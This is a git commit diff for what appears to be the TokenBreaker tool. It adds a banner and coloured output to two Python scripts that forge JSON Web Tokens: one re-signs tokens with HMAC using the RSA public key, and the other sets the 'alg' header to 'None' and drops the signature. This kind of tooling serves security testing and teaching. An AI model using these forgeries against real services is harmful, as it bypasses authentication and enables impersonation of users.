6b93030611b770224fe462005dbaae7c04131591
goron <17004401+Goron1606@users.noreply.github.com>
2018-10-06 21:30:02 +0530

    Added banner and huepy

--- RsaToHmac.py
+++ RsaToHmac.py
@@ -6,6 +6,8 @@ import base64
 import hmac
 import hashlib
 import sys
+from art import *
+from huepy import *
 
 def pad_check(data):
     missing_padding = len(data) % 4
@@ -16,16 +18,20 @@ def pad_check(data):
 def print_header(token,pubkey):
     base64header=pad_check(token.split('.')[0])
     base64payload=pad_check(token.split('.')[1])
-    print "\nDecoded Header value is : "+base64.b64decode(base64header)
-    print "Decode Payload value is : "+base64.b64decode(base64payload)
+    print blue("\nDecoded Header value is : "+base64.b64decode(base64header))
+    print blue("Decode Payload value is : "+base64.b64decode(base64payload))
     header=raw_input("\nEnter your header Value: ")
     payload=raw_input("Enter your payload value: ")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
-    f=open(pubkey,'r')
+    try:
+        f=open(pubkey,'r')
+    except IOError:
+        print red("Unable to open file!")
+        exit(1)
     headerandpayload = base64header + '.' + base64payload
     finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(f.read(), msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')
-    print("\nSuccessfully encoded Token: \n" + finaljwt)
+    print green("\nSuccessfully encoded Token: \n" + finaljwt)
 
 def main():
     parser = argparse.ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
@@ -34,6 +40,7 @@ def main():
     requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
     requiredparser.add_argument('-p','--pubkey',help="Path to Public key File",required=True)
     args = parser.parse_args()
+    tprint('RSA to HMAC')
     print_header(args.token,args.pubkey)
 
 if __name__=='__main__':
--- TheNone.py
+++ TheNone.py
@@ -4,6 +4,8 @@ import argparse
 import base64
 import sys
 import re
+from art import *
+from huepy import *
 
 def verify_Padding(data):
     missing_padding = len(data) % 4
@@ -14,21 +16,21 @@ def verify_Padding(data):
 def processTheNoneToken(token):
     header=base64.b64decode(verify_Padding(token.split('.')[0]))
     payload=base64.b64decode(verify_Padding(token.split('.')[1]))
-    print "\nDecoded Header value is : "+header
-    print "Decode Payload value is : "+payload
+    print blue("\nDecoded Header value is : "+header)
+    print blue("Decode Payload value is : "+payload)
     header=re.sub('"alg":".{5}"','"alg":"None"',header)
-    print "\nNew header value with none algorithm:"
+    print green("\nNew header value with none algorithm:")
     print header
 
     modify_response=raw_input("\nModify Header? (y/n): ")
     if modify_response == 'y':
-        header=raw_input("Enter your header with 'alg' set to 'None': ")
-        print "Header set to: " + header
+        header=raw_input("Enter your header with 'alg' field set to 'None': ")
+        print green("Header set to: " + header)
     payload=raw_input("Enter your payload: ")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
     finaljwt = base64header + '.' + base64payload + "."
-    print("\nSuccessfully encoded Token: \n" + finaljwt)
+    print green("\nSuccessfully encoded Token: \n" + finaljwt)
 
 def main():
     parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
@@ -36,6 +38,7 @@ def main():
     requiredparser=parser.add_argument_group('required arguments')
     requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
     args = parser.parse_args()
+    tprint('The None')
     processTheNoneToken(args.token)
 
 if __name__=='__main__':
